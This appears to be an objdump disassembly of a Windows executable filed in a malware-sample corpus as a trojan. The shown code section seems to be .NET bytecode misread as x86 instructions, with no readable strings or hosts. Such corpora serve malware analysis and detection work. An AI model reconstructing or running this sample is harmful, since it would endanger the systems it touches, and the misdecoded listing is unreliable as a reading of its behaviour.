
malware_samples/trojan/ed0a26904442535518a83879b77cee6e89eea4fa18521be4308d49a6fa290c58.exe:     file format pei-i386


Disassembly of section .text:

00402000 <.text>:
  402000:	50                   	push   %eax
  402001:	c7 00 00 00 00 00    	movl   $0x0,(%eax)
  402007:	00 48 00             	add    %cl,0x0(%eax)
  40200a:	00 00                	add    %al,(%eax)
  40200c:	02 00                	add    (%eax),%al
  40200e:	05 00 fc 59 00       	add    $0x59fc00,%eax
  402013:	00 20                	add    %ah,(%eax)
  402015:	6d                   	insl   (%dx),%es:(%edi)
  402016:	00 00                	add    %al,(%eax)
  402018:	03 00                	add    (%eax),%eax
  40201a:	00 00                	add    %al,(%eax)
  40201c:	01 00                	add    %eax,(%eax)
  40201e:	00 06                	add    %al,(%esi)
	...
  402050:	bf eb 1e 56 fb       	mov    $0xfb561eeb,%edi
  402055:	cd 97                	int    $0x97
  402057:	3b b2 19 02 24 30    	cmp    0x30240219(%edx),%esi
  40205d:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  40205e:	78 43                	js     0x4020a3
  402060:	00 3d 56 44 d2 1e    	add    %bh,0x1ed24456
  402066:	62 b9 d4 f1 80 e7    	bound  %edi,-0x187f0e2c(%ecx)
  40206c:	e6 c3                	out    %al,$0xc3
  40206e:	39 41 2e             	cmp    %eax,0x2e(%ecx)
  402071:	00 2f                	add    %ch,(%edi)
  402073:	00 5c 00 00          	add    %bl,0x0(%eax,%eax,1)
  402077:	00 1e                	add    %bl,(%esi)
  402079:	02 28                	add    (%eax),%ch
  40207b:	18 00                	sbb    %al,(%eax)
  40207d:	00 0a                	add    %cl,(%edx)
  40207f:	2a 1a                	sub    (%edx),%bl
  402081:	7e 13                	jle    0x402096
  402083:	00 00                	add    %al,(%eax)
  402085:	04 2a                	add    $0x2a,%al
  402087:	1e                   	push   %ds
  402088:	02 80 13 00 00 04    	add    0x4000013(%eax),%al
  40208e:	2a 1a                	sub    (%edx),%bl
  402090:	7e 14                	jle    0x4020a6
  402092:	00 00                	add    %al,(%eax)
  402094:	04 2a                	add    $0x2a,%al
  402096:	1e                   	push   %ds
  402097:	02 80 14 00 00 04    	add    0x4000014(%eax),%al
  40209d:	2a 1a                	sub    (%edx),%bl
  40209f:	7e 15                	jle    0x4020b6
  4020a1:	00 00                	add    %al,(%eax)
  4020a3:	04 2a                	add    $0x2a,%al
  4020a5:	1e                   	push   %ds
  4020a6:	02 80 15 00 00 04    	add    0x4000015(%eax),%al
  4020ac:	2a 1a                	sub    (%edx),%bl
  4020ae:	7e 16                	jle    0x4020c6
  4020b0:	00 00                	add    %al,(%eax)
  4020b2:	04 2a                	add    $0x2a,%al
  4020b4:	1e                   	push   %ds
  4020b5:	02 80 16 00 00 04    	add    0x4000016(%eax),%al
  4020bb:	2a 1a                	sub    (%edx),%bl
  4020bd:	7e 17                	jle    0x4020d6
  4020bf:	00 00                	add    %al,(%eax)
  4020c1:	04 2a                	add    $0x2a,%al
  4020c3:	1e                   	push   %ds
  4020c4:	02 80 17 00 00 04    	add    0x4000017(%eax),%al
  4020ca:	2a 1a                	sub    (%edx),%bl
  4020cc:	7e 18                	jle    0x4020e6
  4020ce:	00 00                	add    %al,(%eax)
  4020d0:	04 2a                	add    $0x2a,%al
  4020d2:	1e                   	push   %ds
  4020d3:	02 80 18 00 00 04    	add    0x4000018(%eax),%al
  4020d9:	2a 1a                	sub    (%edx),%bl
  4020db:	7e 19                	jle    0x4020f6
  4020dd:	00 00                	add    %al,(%eax)
  4020df:	04 2a                	add    $0x2a,%al
  4020e1:	1e                   	push   %ds
  4020e2:	02 80 19 00 00 04    	add    0x4000019(%eax),%al
  4020e8:	2a 1a                	sub    (%edx),%bl
  4020ea:	7e 1a                	jle    0x402106
  4020ec:	00 00                	add    %al,(%eax)
  4020ee:	04 2a                	add    $0x2a,%al
  4020f0:	1a 7e 1b             	sbb    0x1b(%esi),%bh
  4020f3:	00 00                	add    %al,(%eax)
  4020f5:	04 2a                	add    $0x2a,%al
  4020f7:	1e                   	push   %ds
  4020f8:	02 80 1b 00 00 04    	add    0x400001b(%eax),%al
  4020fe:	2a 1a                	sub    (%edx),%bl
  402100:	7e 1c                	jle    0x40211e
  402102:	00 00                	add    %al,(%eax)
  402104:	04 2a                	add    $0x2a,%al
  402106:	1e                   	push   %ds
  402107:	02 80 1c 00 00 04    	add    0x400001c(%eax),%al
  40210d:	2a 1a                	sub    (%edx),%bl
  40210f:	7e 1d                	jle    0x40212e
  402111:	00 00                	add    %al,(%eax)
  402113:	04 2a                	add    $0x2a,%al
  402115:	1e                   	push   %ds
  402116:	02 80 1d 00 00 04    	add    0x400001d(%eax),%al
  40211c:	2a 2a                	sub    (%edx),%ch
  40211e:	02 28                	add    (%eax),%ch
  402120:	3e 00 00             	add    %al,%ds:(%eax)
  402123:	0a 16                	or     (%esi),%dl
  402125:	fe 03                	incb   (%ebx)
  402127:	2a 32                	sub    (%edx),%dh
  402129:	7e 0b                	jle    0x402136
  40212b:	00 00                	add    %al,(%eax)
  40212d:	04 03                	add    $0x3,%al
  40212f:	6f                   	outsl  %ds:(%esi),(%dx)
  402130:	3f                   	aas
  402131:	00 00                	add    %al,(%eax)
  402133:	0a 2a                	or     (%edx),%ch
  402135:	2e 73 18             	jae,pn 0x402150
  402138:	00 00                	add    %al,(%eax)
  40213a:	0a 80 1a 00 00 04    	or     0x400001a(%eax),%al
  402140:	2a e6                	sub    %dh,%ah
  402142:	28 29                	sub    %ch,(%ecx)
  402144:	00 00                	add    %al,(%eax)
  402146:	06                   	push   %es
  402147:	3a 28                	cmp    (%eax),%ch
  402149:	00 00                	add    %al,(%eax)
  40214b:	00 28                	add    %ch,(%eax)
  40214d:	2a 00                	sub    (%eax),%al
  40214f:	00 06                	add    %al,(%esi)
  402151:	3a 1e                	cmp    (%esi),%bl
  402153:	00 00                	add    %al,(%eax)
  402155:	00 28                	add    %ch,(%eax)
  402157:	2b 00                	sub    (%eax),%eax
  402159:	00 06                	add    %al,(%esi)
  40215b:	3a 14 00             	cmp    (%eax,%eax,1),%dl
  40215e:	00 00                	add    %al,(%eax)
  402160:	28 27                	sub    %ah,(%edi)
  402162:	00 00                	add    %al,(%eax)
  402164:	06                   	push   %es
  402165:	3a 0a                	cmp    (%edx),%cl
  402167:	00 00                	add    %al,(%eax)
  402169:	00 28                	add    %ch,(%eax)
  40216b:	28 00                	sub    %al,(%eax)
  40216d:	00 06                	add    %al,(%esi)
  40216f:	39 06                	cmp    %eax,(%esi)
  402171:	00 00                	add    %al,(%eax)
  402173:	00 14 28             	add    %dl,(%eax,%ebp,1)
  402176:	76 00                	jbe    0x402178
  402178:	00 0a                	add    %cl,(%edx)
  40217a:	2a 56 28             	sub    0x28(%esi),%dl
  40217d:	9c                   	pushf
  40217e:	00 00                	add    %al,(%eax)
  402180:	0a 73 9d             	or     -0x63(%ebx),%dh
  402183:	00 00                	add    %al,(%eax)
  402185:	0a 20                	or     (%eax),%ah
  402187:	20 02                	and    %al,(%edx)
  402189:	00 00                	add    %al,(%eax)
  40218b:	6f                   	outsl  %ds:(%esi),(%dx)
  40218c:	9e                   	sahf
  40218d:	00 00                	add    %al,(%eax)
  40218f:	0a 2a                	or     (%edx),%ch
  402191:	6e                   	outsb  %ds:(%esi),(%dx)
  402192:	7e 1e                	jle    0x4021b2
  402194:	00 00                	add    %al,(%eax)
  402196:	04 39                	add    $0x39,%al
  402198:	10 00                	adc    %al,(%eax)
  40219a:	00 00                	add    %al,(%eax)
  40219c:	7e 1e                	jle    0x4021bc
  40219e:	00 00                	add    %al,(%eax)
  4021a0:	04 6f                	add    $0x6f,%al
  4021a2:	ad                   	lods   %ds:(%esi),%eax
  4021a3:	00 00                	add    %al,(%eax)
  4021a5:	0a 14 80             	or     (%eax,%eax,4),%dl
  4021a8:	1e                   	push   %ds
  4021a9:	00 00                	add    %al,(%eax)
  4021ab:	04 2a                	add    $0x2a,%al
  4021ad:	7e 7e                	jle    0x40222d
  4021af:	0f 00 00             	sldt   (%eax)
  4021b2:	04 28                	add    $0x28,%al
  4021b4:	17                   	pop    %ss
  4021b5:	00 00                	add    %al,(%eax)
  4021b7:	0a 39                	or     (%ecx),%bh
  4021b9:	0f 00 00             	sldt   (%eax)
  4021bc:	00 28                	add    %ch,(%eax)
  4021be:	30 00                	xor    %al,(%eax)
  4021c0:	00 06                	add    %al,(%esi)
  4021c2:	39 05 00 00 00 28    	cmp    %eax,0x28000000
  4021c8:	40                   	inc    %eax
  4021c9:	00 00                	add    %al,(%eax)
  4021cb:	06                   	push   %es
  4021cc:	2a 56 72             	sub    0x72(%esi),%dl
  4021cf:	bc 25 00 70 7e       	mov    $0x7e700025,%esp
  4021d4:	10 00                	adc    %al,(%eax)
  4021d6:	00 04 28             	add    %al,(%eax,%ebp,1)
  4021d9:	6f                   	outsl  %ds:(%esi),(%dx)
  4021da:	00 00                	add    %al,(%eax)
  4021dc:	0a 80 23 00 00 04    	or     0x4000023(%eax),%al
  4021e2:	2a be 73 94 00 00    	sub    0x9473(%esi),%bh
  4021e8:	06                   	push   %es
  4021e9:	25 72 70 21 00       	and    $0x217072,%eax
  4021ee:	70 6f                	jo     0x40225f
  4021f0:	7f 00                	jg     0x4021f2
  4021f2:	00 06                	add    %al,(%esi)
  4021f4:	72 68                	jb     0x40225e
  4021f6:	26 00 70 6f          	add    %dh,%es:0x6f(%eax)
  4021fa:	8c 00                	mov    %es,(%eax)
  4021fc:	00 06                	add    %al,(%esi)
  4021fe:	6f                   	outsl  %ds:(%esi),(%dx)
  4021ff:	89 00                	mov    %eax,(%eax)
  402201:	00 06                	add    %al,(%esi)
  402203:	28 20                	sub    %ah,(%eax)
  402205:	00 00                	add    %al,(%eax)
  402207:	06                   	push   %es
  402208:	20 e8                	and    %ch,%al
  40220a:	03 00                	add    (%eax),%eax
  40220c:	00 28                	add    %ch,(%eax)
  40220e:	14 00                	adc    $0x0,%al
  402210:	00 0a                	add    %cl,(%edx)
  402212:	2a da                	sub    %dl,%bl
  402214:	73 94                	jae    0x4021aa
  402216:	00 00                	add    %al,(%eax)
  402218:	06                   	push   %es
  402219:	25 72 70 21 00       	and    $0x217072,%eax
  40221e:	70 6f                	jo     0x40228f
  402220:	7f 00                	jg     0x402222
  402222:	00 06                	add    %al,(%esi)
  402224:	72 7a                	jb     0x4022a0
  402226:	26 00 70 6f          	add    %dh,%es:0x6f(%eax)
  40222a:	8c 00                	mov    %es,(%eax)
  40222c:	00 06                	add    %al,(%esi)
  40222e:	25 72 7a 26 00       	and    $0x267a72,%eax
  402233:	70 6f                	jo     0x4022a4
  402235:	7f 00                	jg     0x402237
  402237:	00 06                	add    %al,(%esi)
  402239:	02 6f 8c             	add    -0x74(%edi),%ch
  40223c:	00 00                	add    %al,(%eax)
  40223e:	06                   	push   %es
  40223f:	6f                   	outsl  %ds:(%esi),(%dx)
  402240:	89 00                	mov    %eax,(%eax)
  402242:	00 06                	add    %al,(%esi)
  402244:	28 20                	sub    %ah,(%eax)
  402246:	00 00                	add    %al,(%eax)
  402248:	06                   	push   %es
  402249:	2a 2e                	sub    (%esi),%ch
  40224b:	73 c9                	jae    0x402216
  40224d:	00 00                	add    %al,(%eax)
  40224f:	0a 80 24 00 00 04    	or     0x4000024(%eax),%al
  402255:	2a 5e 02             	sub    0x2(%esi),%bl
  402258:	28 19                	sub    %bl,(%ecx)
  40225a:	00 00                	add    %al,(%eax)
  40225c:	0a 03                	or     (%ebx),%al
  40225e:	6f                   	outsl  %ds:(%esi),(%dx)
  40225f:	1f                   	pop    %ds
  402260:	00 00                	add    %al,(%eax)
  402262:	0a 28                	or     (%eax),%ch
  402264:	4d                   	dec    %ebp
  402265:	00 00                	add    %al,(%eax)
  402267:	06                   	push   %es
  402268:	28 ce                	sub    %cl,%dh
  40226a:	00 00                	add    %al,(%eax)
  40226c:	0a 2a                	or     (%edx),%ch
  40226e:	5e                   	pop    %esi
  40226f:	28 19                	sub    %bl,(%ecx)
  402271:	00 00                	add    %al,(%eax)
  402273:	0a 02                	or     (%edx),%al
  402275:	03 28                	add    (%eax),%ebp
  402277:	1a 00                	sbb    (%eax),%al
  402279:	00 0a                	add    %cl,(%edx)
  40227b:	28 4f 00             	sub    %cl,0x0(%edi)
  40227e:	00 06                	add    %al,(%esi)
  402280:	6f                   	outsl  %ds:(%esi),(%dx)
  402281:	1b 00                	sbb    (%eax),%eax
  402283:	00 0a                	add    %cl,(%edx)
  402285:	2a 62 1f             	sub    0x1f(%edx),%ah
  402288:	20 8d 44 00 00 01    	and    %cl,0x1000044(%ebp)
  40228e:	25 d0 2d 00 00       	and    $0x2dd0,%eax
  402293:	04 28                	add    $0x28,%al
  402295:	e4 00                	in     $0x0,%al
  402297:	00 0a                	add    %cl,(%edx)
  402299:	80 2c 00 00          	subb   $0x0,(%eax,%eax,1)
  40229d:	04 2a                	add    $0x2a,%al
  40229f:	32 7e 2e             	xor    0x2e(%esi),%bh
  4022a2:	00 00                	add    %al,(%eax)
  4022a4:	04 02                	add    $0x2,%al
  4022a6:	6f                   	outsl  %ds:(%esi),(%dx)
  4022a7:	1f                   	pop    %ds
  4022a8:	00 00                	add    %al,(%eax)
  4022aa:	0a 2a                	or     (%edx),%ch
  4022ac:	32 7e 2e             	xor    0x2e(%esi),%bh
  4022af:	00 00                	add    %al,(%eax)
  4022b1:	04 02                	add    $0x2,%al
  4022b3:	6f                   	outsl  %ds:(%esi),(%dx)
  4022b4:	1b 00                	sbb    (%eax),%eax
  4022b6:	00 0a                	add    %cl,(%edx)
  4022b8:	2a 32                	sub    (%edx),%dh
  4022ba:	02 28                	add    (%eax),%ch
  4022bc:	e7 00                	out    %eax,$0x0
  4022be:	00 0a                	add    %cl,(%edx)
  4022c0:	28 58 00             	sub    %bl,0x0(%eax)
  4022c3:	00 06                	add    %al,(%esi)
  4022c5:	2a 8e 1a 8d 44 00    	sub    0x448d1a(%esi),%cl
  4022cb:	00 01                	add    %al,(%ecx)
  4022cd:	25 19 02 d2 9c       	and    $0x9cd20219,%eax
  4022d2:	25 18 02 1e 63       	and    $0x631e0218,%eax
  4022d7:	d2 9c 25 17 02 1f 10 	rcrb   %cl,0x101f0217(%ebp,%eiz,1)
  4022de:	63 d2                	arpl   %edx,%edx
  4022e0:	9c                   	pushf
  4022e1:	25 16 02 1f 18       	and    $0x181f0216,%eax
  4022e6:	63 d2                	arpl   %edx,%edx
  4022e8:	9c                   	pushf
  4022e9:	2a 4e 18             	sub    0x18(%esi),%cl
  4022ec:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  4022f0:	01 25 17 02 d2 9c    	add    %esp,0x9cd20217
  4022f6:	25 16 02 1e 63       	and    $0x631e0216,%eax
  4022fb:	d2 9c 2a 32 02 28 e8 	rcrb   %cl,-0x17d7fdce(%edx,%ebp,1)
  402302:	00 00                	add    %al,(%eax)
  402304:	0a 28                	or     (%eax),%ch
  402306:	58                   	pop    %eax
  402307:	00 00                	add    %al,(%eax)
  402309:	06                   	push   %es
  40230a:	2a 2e                	sub    (%esi),%ch
  40230c:	73 e9                	jae    0x4022f7
  40230e:	00 00                	add    %al,(%eax)
  402310:	0a 80 2e 00 00 04    	or     0x400002e(%eax),%al
  402316:	2a 56 02             	sub    0x2(%esi),%dl
  402319:	15 7d 30 00 00       	adc    $0x307d,%eax
  40231e:	04 02                	add    $0x2,%al
  402320:	28 18                	sub    %bl,(%eax)
  402322:	00 00                	add    %al,(%eax)
  402324:	0a 02                	or     (%edx),%al
  402326:	03 7d 2f             	add    0x2f(%ebp),%edi
  402329:	00 00                	add    %al,(%eax)
  40232b:	04 2a                	add    $0x2a,%al
  40232d:	4a                   	dec    %edx
  40232e:	02 7b 2f             	add    0x2f(%ebx),%bh
  402331:	00 00                	add    %al,(%eax)
  402333:	04 02                	add    $0x2,%al
  402335:	7b 30                	jnp    0x402367
  402337:	00 00                	add    %al,(%eax)
  402339:	04 6f                	add    $0x6f,%al
  40233b:	ea 00 00 0a 2a 8a 02 	ljmp   $0x28a,$0x2a0a0000
  402342:	02 7b 30             	add    0x30(%ebx),%bh
  402345:	00 00                	add    %al,(%eax)
  402347:	04 17                	add    $0x17,%al
  402349:	58                   	pop    %eax
  40234a:	7d 30                	jge    0x40237c
  40234c:	00 00                	add    %al,(%eax)
  40234e:	04 02                	add    $0x2,%al
  402350:	7b 30                	jnp    0x402382
  402352:	00 00                	add    %al,(%eax)
  402354:	04 02                	add    $0x2,%al
  402356:	7b 2f                	jnp    0x402387
  402358:	00 00                	add    %al,(%eax)
  40235a:	04 6f                	add    $0x6f,%al
  40235c:	eb 00                	jmp    0x40235e
  40235e:	00 0a                	add    %cl,(%edx)
  402360:	fe 04 2a             	incb   (%edx,%ebp,1)
  402363:	22 02                	and    (%edx),%al
  402365:	15 7d 30 00 00       	adc    $0x307d,%eax
  40236a:	04 2a                	add    $0x2a,%al
  40236c:	56                   	push   %esi
  40236d:	02 28                	add    (%eax),%ch
  40236f:	18 00                	sbb    %al,(%eax)
  402371:	00 0a                	add    %cl,(%edx)
  402373:	02 03                	add    (%ebx),%al
  402375:	7d 32                	jge    0x4023a9
  402377:	00 00                	add    %al,(%eax)
  402379:	04 02                	add    $0x2,%al
  40237b:	04 7d                	add    $0x7d,%al
  40237d:	31 00                	xor    %eax,(%eax)
  40237f:	00 04 2a             	add    %al,(%edx,%ebp,1)
  402382:	32 02                	xor    (%edx),%al
  402384:	7b 32                	jnp    0x4023b8
  402386:	00 00                	add    %al,(%eax)
  402388:	04 6f                	add    $0x6f,%al
  40238a:	71 00                	jno    0x40238c
  40238c:	00 06                	add    %al,(%esi)
  40238e:	2a 4e 02             	sub    0x2(%esi),%cl
  402391:	7b 32                	jnp    0x4023c5
  402393:	00 00                	add    %al,(%eax)
  402395:	04 6f                	add    $0x6f,%al
  402397:	71 00                	jno    0x402399
  402399:	00 06                	add    %al,(%esi)
  40239b:	25 03 6f 8c 00       	and    $0x8c6f03,%eax
  4023a0:	00 06                	add    %al,(%esi)
  4023a2:	2a 4e 02             	sub    0x2(%esi),%cl
  4023a5:	7b 32                	jnp    0x4023d9
  4023a7:	00 00                	add    %al,(%eax)
  4023a9:	04 6f                	add    $0x6f,%al
  4023ab:	71 00                	jno    0x4023ad
  4023ad:	00 06                	add    %al,(%esi)
  4023af:	25 03 6f 74 00       	and    $0x746f03,%eax
  4023b4:	00 06                	add    %al,(%esi)
  4023b6:	2a 4e 02             	sub    0x2(%esi),%cl
  4023b9:	7b 32                	jnp    0x4023ed
  4023bb:	00 00                	add    %al,(%eax)
  4023bd:	04 6f                	add    $0x6f,%al
  4023bf:	71 00                	jno    0x4023c1
  4023c1:	00 06                	add    %al,(%esi)
  4023c3:	25 03 6f 85 00       	and    $0x856f03,%eax
  4023c8:	00 06                	add    %al,(%esi)
  4023ca:	2a 36                	sub    (%esi),%dh
  4023cc:	02 7b 31             	add    0x31(%ebx),%bh
  4023cf:	00 00                	add    %al,(%eax)
  4023d1:	04 03                	add    $0x3,%al
  4023d3:	6f                   	outsl  %ds:(%esi),(%dx)
  4023d4:	ea 00 00 0a 2a 32 02 	ljmp   $0x232,$0x2a0a0000
  4023db:	7b 31                	jnp    0x40240e
  4023dd:	00 00                	add    %al,(%eax)
  4023df:	04 6f                	add    $0x6f,%al
  4023e1:	eb 00                	jmp    0x4023e3
  4023e3:	00 0a                	add    %cl,(%edx)
  4023e5:	2a 66 02             	sub    0x2(%esi),%ah
  4023e8:	03 7d 33             	add    0x33(%ebp),%edi
  4023eb:	00 00                	add    %al,(%eax)
  4023ed:	04 02                	add    $0x2,%al
  4023ef:	02 7b 33             	add    0x33(%ebx),%bh
  4023f2:	00 00                	add    %al,(%eax)
  4023f4:	04 6f                	add    $0x6f,%al
  4023f6:	7d 00                	jge    0x4023f8
  4023f8:	00 0a                	add    %cl,(%edx)
  4023fa:	7d 34                	jge    0x402430
  4023fc:	00 00                	add    %al,(%eax)
  4023fe:	04 2a                	add    $0x2a,%al
  402400:	82 02 7b             	addb   $0x7b,(%edx)
  402403:	36 00 00             	add    %al,%ss:(%eax)
  402406:	04 18                	add    $0x18,%al
  402408:	3b 0d 00 00 00 02    	cmp    0x2000000,%ecx
  40240e:	28 6b 00             	sub    %ch,0x0(%ebx)
  402411:	00 06                	add    %al,(%esi)
  402413:	02 18                	add    (%eax),%bl
  402415:	7d 36                	jge    0x40244d
  402417:	00 00                	add    %al,(%eax)
  402419:	04 02                	add    $0x2,%al
  40241b:	28 6c 00 00          	sub    %ch,0x0(%eax,%eax,1)
  40241f:	06                   	push   %es
  402420:	2a 82 02 7b 36 00    	sub    0x367b02(%edx),%al
  402426:	00 04 19             	add    %al,(%ecx,%ebx,1)
  402429:	3b 0d 00 00 00 02    	cmp    0x2000000,%ecx
  40242f:	28 6b 00             	sub    %ch,0x0(%ebx)
  402432:	00 06                	add    %al,(%esi)
  402434:	02 19                	add    (%ecx),%bl
  402436:	7d 36                	jge    0x40246e
  402438:	00 00                	add    %al,(%eax)
  40243a:	04 02                	add    $0x2,%al
  40243c:	28 6c 00 00          	sub    %ch,0x0(%eax,%eax,1)
  402440:	06                   	push   %es
  402441:	2a 1e                	sub    (%esi),%bl
  402443:	02 28                	add    (%eax),%ch
  402445:	70 00                	jo     0x402447
  402447:	00 06                	add    %al,(%esi)
  402449:	2a 52 02             	sub    0x2(%edx),%dl
  40244c:	03 8c 68 00 00 01 7d 	add    0x7d010000(%eax,%ebp,2),%ecx
  402453:	35 00 00 04 02       	xor    $0x2040000,%eax
  402458:	1b 7d 36             	sbb    0x36(%ebp),%edi
  40245b:	00 00                	add    %al,(%eax)
  40245d:	04 2a                	add    $0x2a,%al
  40245f:	52                   	push   %edx
  402460:	02 03                	add    (%ebx),%al
  402462:	8c 95 00 00 01 7d    	mov    %ss,0x7d010000(%ebp)
  402468:	35 00 00 04 02       	xor    $0x2040000,%eax
  40246d:	1c 7d                	sbb    $0x7d,%al
  40246f:	36 00 00             	add    %al,%ss:(%eax)
  402472:	04 2a                	add    $0x2a,%al
  402474:	42                   	inc    %edx
  402475:	02 03                	add    (%ebx),%al
  402477:	7d 35                	jge    0x4024ae
  402479:	00 00                	add    %al,(%eax)
  40247b:	04 02                	add    $0x2,%al
  40247d:	1f                   	pop    %ds
  40247e:	0b 7d 36             	or     0x36(%ebp),%edi
  402481:	00 00                	add    %al,(%eax)
  402483:	04 2a                	add    $0x2a,%al
  402485:	52                   	push   %edx
  402486:	02 28                	add    (%eax),%ch
  402488:	70 00                	jo     0x40248a
  40248a:	00 06                	add    %al,(%esi)
  40248c:	25 03 7d 33 00       	and    $0x337d03,%eax
  402491:	00 04 04             	add    %al,(%esp,%eax,1)
  402494:	6f                   	outsl  %ds:(%esi),(%dx)
  402495:	81 00 00 06 2a 56    	addl   $0x562a0600,(%eax)
  40249b:	02 28                	add    (%eax),%ch
  40249d:	70 00                	jo     0x40249f
  40249f:	00 06                	add    %al,(%esi)
  4024a1:	25 03 7d 33 00       	and    $0x337d03,%eax
  4024a6:	00 04 04             	add    %al,(%esp,%eax,1)
  4024a9:	6a 6f                	push   $0x6f
  4024ab:	74 00                	je     0x4024ad
  4024ad:	00 06                	add    %al,(%esi)
  4024af:	2a 56 02             	sub    0x2(%esi),%dl
  4024b2:	28 6b 00             	sub    %ch,0x0(%ebx)
  4024b5:	00 06                	add    %al,(%esi)
  4024b7:	02 14 7d 35 00 00 04 	add    0x4000035(,%edi,2),%dl
  4024be:	02 17                	add    (%edi),%dl
  4024c0:	7d 36                	jge    0x4024f8
  4024c2:	00 00                	add    %al,(%eax)
  4024c4:	04 2a                	add    $0x2a,%al
  4024c6:	3e 02 03             	add    %ds:(%ebx),%al
  4024c9:	7d 35                	jge    0x402500
  4024cb:	00 00                	add    %al,(%eax)
  4024cd:	04 02                	add    $0x2,%al
  4024cf:	1a 7d 36             	sbb    0x36(%ebp),%bh
  4024d2:	00 00                	add    %al,(%eax)
  4024d4:	04 2a                	add    $0x2a,%al
  4024d6:	76 02                	jbe    0x4024da
  4024d8:	7b 35                	jnp    0x40250f
  4024da:	00 00                	add    %al,(%eax)
  4024dc:	04 3a                	add    $0x3a,%al
  4024de:	06                   	push   %es
  4024df:	00 00                	add    %al,(%eax)
  4024e1:	00 72 6a             	add    %dh,0x6a(%edx)
  4024e4:	21 00                	and    %eax,(%eax)
  4024e6:	70 2a                	jo     0x402512
  4024e8:	02 7b 35             	add    0x35(%ebx),%bh
  4024eb:	00 00                	add    %al,(%eax)
  4024ed:	04 6f                	add    $0x6f,%al
  4024ef:	38 00                	cmp    %al,(%eax)
  4024f1:	00 0a                	add    %cl,(%edx)
  4024f3:	2a 52 02             	sub    0x2(%edx),%dl
  4024f6:	1d 7d 36 00 00       	sbb    $0x367d,%eax
  4024fb:	04 02                	add    $0x2,%al
  4024fd:	03 8c 6c 00 00 01 7d 	add    0x7d010000(%esp,%ebp,2),%ecx
  402504:	35 00 00 04 2a       	xor    $0x2a040000,%eax
  402509:	56                   	push   %esi
  40250a:	02 1f                	add    (%edi),%bl
  40250c:	09 7d 36             	or     %edi,0x36(%ebp)
  40250f:	00 00                	add    %al,(%eax)
  402511:	04 02                	add    $0x2,%al
  402513:	03 8c 97 00 00 01 7d 	add    0x7d010000(%edi,%edx,4),%ecx
  40251a:	35 00 00 04 2a       	xor    $0x2a040000,%eax
  40251f:	52                   	push   %edx
  402520:	02 1e                	add    (%esi),%bl
  402522:	7d 36                	jge    0x40255a
  402524:	00 00                	add    %al,(%eax)
  402526:	04 02                	add    $0x2,%al
  402528:	03 8c 96 00 00 01 7d 	add    0x7d010000(%esi,%edx,4),%ecx
  40252f:	35 00 00 04 2a       	xor    $0x2a040000,%eax
  402534:	1e                   	push   %ds
  402535:	02 28                	add    (%eax),%ch
  402537:	82 00 00             	addb   $0x0,(%eax)
  40253a:	06                   	push   %es
  40253b:	2a 22                	sub    (%edx),%ah
  40253d:	02 03                	add    (%ebx),%al
  40253f:	28 81 00 00 06 2a    	sub    %al,0x2a060000(%ecx)
  402545:	1e                   	push   %ds
  402546:	02 28                	add    (%eax),%ch
  402548:	77 00                	ja     0x40254a
  40254a:	00 06                	add    %al,(%esi)
  40254c:	2a 22                	sub    (%edx),%ah
  40254e:	02 03                	add    (%ebx),%al
  402550:	28 74 00 00          	sub    %dh,0x0(%eax,%eax,1)
  402554:	06                   	push   %es
  402555:	2a 1e                	sub    (%esi),%bl
  402557:	02 28                	add    (%eax),%ch
  402559:	78 00                	js     0x40255b
  40255b:	00 06                	add    %al,(%esi)
  40255d:	2a 22                	sub    (%edx),%ah
  40255f:	02 03                	add    (%ebx),%al
  402561:	28 85 00 00 06 2a    	sub    %al,0x2a060000(%ebp)
  402567:	1e                   	push   %ds
  402568:	02 7b 36             	add    0x36(%ebx),%bh
  40256b:	00 00                	add    %al,(%eax)
  40256d:	04 2a                	add    $0x2a,%al
  40256f:	32 02                	xor    (%edx),%al
  402571:	7b 38                	jnp    0x4025ab
  402573:	00 00                	add    %al,(%eax)
  402575:	04 73                	add    $0x73,%al
  402577:	5f                   	pop    %edi
  402578:	00 00                	add    %al,(%eax)
  40257a:	06                   	push   %es
  40257b:	2a 4a 02             	sub    0x2(%edx),%cl
  40257e:	73 c9                	jae    0x402549
  402580:	00 00                	add    %al,(%eax)
  402582:	0a 7d 38             	or     0x38(%ebp),%bh
  402585:	00 00                	add    %al,(%eax)
  402587:	04 02                	add    $0x2,%al
  402589:	28 18                	sub    %bl,(%eax)
  40258b:	00 00                	add    %al,(%eax)
  40258d:	0a 2a                	or     (%edx),%ch
  40258f:	3a 02                	cmp    (%edx),%al
  402591:	6f                   	outsl  %ds:(%esi),(%dx)
  402592:	00 01                	add    %al,(%ecx)
  402594:	00 0a                	add    %cl,(%edx)
  402596:	d2 02                	rolb   %cl,(%edx)
  402598:	28 97 00 00 06 2a    	sub    %dl,0x2a060000(%edi)
  40259e:	32 02                	xor    (%edx),%al
  4025a0:	20 c0                	and    %al,%al
  4025a2:	00 00                	add    %al,(%eax)
  4025a4:	00 6f ee             	add    %ch,-0x12(%edi)
  4025a7:	00 00                	add    %al,(%eax)
  4025a9:	0a 2a                	or     (%edx),%ch
  4025ab:	6a 02                	push   $0x2
  4025ad:	20 cb                	and    %cl,%bl
  4025af:	00 00                	add    %al,(%eax)
  4025b1:	00 6f ee             	add    %ch,-0x12(%edi)
  4025b4:	00 00                	add    %al,(%eax)
  4025b6:	0a 02                	or     (%edx),%al
  4025b8:	03 28                	add    (%eax),%ebp
  4025ba:	5c                   	pop    %esp
  4025bb:	00 00                	add    %al,(%eax)
  4025bd:	06                   	push   %es
  4025be:	16                   	push   %ss
  4025bf:	1e                   	push   %ds
  4025c0:	6f                   	outsl  %ds:(%esi),(%dx)
  4025c1:	4c                   	dec    %esp
  4025c2:	00 00                	add    %al,(%eax)
  4025c4:	0a 2a                	or     (%edx),%ch
  4025c6:	7e 02                	jle    0x4025ca
  4025c8:	20 ca                	and    %cl,%dl
  4025ca:	00 00                	add    %al,(%eax)
  4025cc:	00 6f ee             	add    %ch,-0x12(%edi)
  4025cf:	00 00                	add    %al,(%eax)
  4025d1:	0a 02                	or     (%edx),%al
  4025d3:	03 28                	add    (%eax),%ebp
  4025d5:	fd                   	std
  4025d6:	00 00                	add    %al,(%eax)
  4025d8:	0a 28                	or     (%eax),%ch
  4025da:	58                   	pop    %eax
  4025db:	00 00                	add    %al,(%eax)
  4025dd:	06                   	push   %es
  4025de:	16                   	push   %ss
  4025df:	1a 6f 4c             	sbb    0x4c(%edi),%ch
  4025e2:	00 00                	add    %al,(%eax)
  4025e4:	0a 2a                	or     (%edx),%ch
  4025e6:	7a 03                	jp     0x4025eb
